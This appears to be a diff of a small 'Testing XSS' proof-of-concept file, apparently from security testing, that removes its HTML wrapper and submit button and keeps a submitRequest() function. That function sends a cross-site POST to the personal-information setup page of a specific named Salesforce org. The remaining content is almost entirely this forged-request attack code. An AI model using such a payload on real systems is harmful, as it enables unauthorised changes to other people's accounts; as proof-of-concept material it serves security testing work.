@@ -1,10 +1,4 @@
-<!DOCTYPE html>
-    <h1>Testing XSS</h1>
- <html>
-  <body>
-  <script>history.pushState('', '', '/')</script>
-    <script>
-      function submitRequest()
+function submitRequest()
       {
         var xhr = new XMLHttpRequest();
         xhr.open("POST", "https:\/\/brownbaggraphicsllc2.my.salesforce.com\/setup\/personalInformationSetup.apexp?isdtp=p1&sfdcIFrameOrigin=https:\/\/brownbaggraphicsllc2.lightning.force.com&clc=1", true);
@@ -18,9 +12,3 @@
           aBody[i] = body.charCodeAt(i); 
         xhr.send(new Blob([aBody]));
       }
-    </script>
-    <form action="#">
-      <input type="button" value="Submit request" onclick="submitRequest();" />
-    </form>
-  </body>
-</html>
